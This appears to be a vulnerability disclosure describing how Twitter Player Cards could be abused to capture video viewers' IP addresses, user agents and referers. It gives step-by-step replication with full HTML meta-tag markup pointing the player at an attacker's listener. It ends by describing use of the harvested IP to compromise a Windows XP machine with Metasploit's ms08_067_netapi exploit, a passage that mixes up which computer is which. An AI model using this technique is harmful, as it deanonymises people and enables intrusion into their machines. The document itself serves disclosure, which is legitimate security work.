# Twitter Card Backdoor

## Summary

Twitter allows the embedding of videos in a tweet via [Player Cards](https://dev.twitter.com/docs/cards/types/player-card). The problem is in the playing method of the video, currently, it uses a sandbox (`iframe`)  to play the embedded video(s) even when this might be protected against [Cross-site scripting (XSS)](https://en.wikipedia.org/wiki/Cross-site_scripting), still being unsafe because it doesn't protect **HTTP Request Sender**  information such as **IP Address, User-Agent and the referer**.
> A lot of Twitter users used to use a VPN to keep these safe from Twitter himself, will they agreed to share them with 3rd-part and this 3rd-part could be anyone

The attacker can embed a link to a request logger or can listen to connections in order to get the IP address of the video viewer.   

## Replication Steps

#### Step 1: Adding the pertinent Twitter meta tags to your page
You need to add some Twitter specific meta tags to your page to enable Twitter Player Cards. 

|Name|Content|
|--- |--- |
|twitter:card|Type of Twitter card; Must be set to a value of “player”|
|twitter:title|The title of your content as it should appear in the card|
|twitter:site|The Twitter @username the card should be attributed to|
|twitter:description|Description of the content (optional)|
|twitter:player|Listener or Request Logger URL **Must be HTTPS URL**|
|twitter:player:width|Width of IFRAME specified in twitter:player in pixels|
|twitter:player:height|Height of IFRAME specified in twitter:player in pixels|
|twitter:image|Image to be displayed in place of the player on platforms that don’t support iframes or inline players; you should make this image the same dimensions as your player|

Here is a example with a listener in 192.168.1.1:2020:

```html
<meta name="twitter:card" content="player" />
<meta name="twitter:title" content="Twitter cards vulnerability" />
<meta name="twitter:description" content="Twitter cards vulnerability allows to get the video viewer IP, Listen to 192.168.1.1:2020 on your machine then play the video you will be surprised" />
<meta name="twitter:player" content="https://192.168.1.1:2020" />
<meta name="twitter:player:width" content="360" />
<meta name="twitter:player:height" content="203" />
<meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/de/thumb/9/9f/Twitter_bird_logo_2012.svg/154px-Twitter_bird_logo_2012.svg.png" />
```


----------


#### Step 2:  Launch your page


----------


#### Step 3: Validate your card using the Twitter Validator Tool:
Once you have added the meta tags and published your page, copy and paste the page URL into the [Twitter Card Validator](https://cards-dev.twitter.com/validator) and then click **Preview Card**.

![F156985](https://cdn.rawgit.com/xc0d3rz/Abstract-jekyll/c690ee51/img/Screenshot_at_2017-02-02_23_41_50.png)

----------


#### Step 4: Request approval for whitelisting
If your domain has not been whitelisted by Twitter, the Player Cards will not appear. When validating the URL, a message will appear stating that the URL has not been whitelisted.


Click **Request Approval** to begin the approval process. You will be required to provide additional information about your domain. For more information on the approval process, see the [Twitter documentation](https://dev.twitter.com/cards/types/player/approval).

![F156986](https://cdn.rawgit.com/xc0d3rz/Abstract-jekyll/c690ee51/img/Screenshot_at_2017-02-02_23_49_24.png)


----------


#### Step 5: Share it on twitter:
When the embedded video is played you might received the viewer(s) IP (I suggest to use a request logger) .

![F156990](https://cdn.rawgit.com/xc0d3rz/Abstract-jekyll/c690ee51/img/Screenshot_at_2017-02-02_23_52_28.png)


### PoC Video

I made a video as a proof of concept, testing the vulnerability on a Virtual Machine running on WINXP SP2.(**Computer B**)
The source code of tw.html page:

```html

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Twitter cards vulnerability</title>
<meta name="twitter:card" content="player" />
<meta name="twitter:title" content="Twitter cards vulnerability" />
<meta name="twitter:description" content="Twitter cards vulnerability allows to get the video viewer IP, Listen to 192.168.1.1:2020 on your machine then play the video you will be surprised" />
<meta name="twitter:player" content="https://192.168.1.1:2020" />
<meta name="twitter:player:width" content="360" />
<meta name="twitter:player:height" content="203" />
<meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/de/thumb/9/9f/Twitter_bird_logo_2012.svg/154px-Twitter_bird_logo_2012.svg.png" />
</head>
</html>
```
I've hosted the page on a server, shared it on twitter and then played the embedded video in the the Virtual Machine. Eventually I got **B's ip address.** by listening to in the port **2020**  coming from **Computer A** to then attack **Computer B** with metasploit's `ms08_067_netapi` exploit gaining access to **Computer A**.

https://www.youtube.com/embed/0occxD9v11M
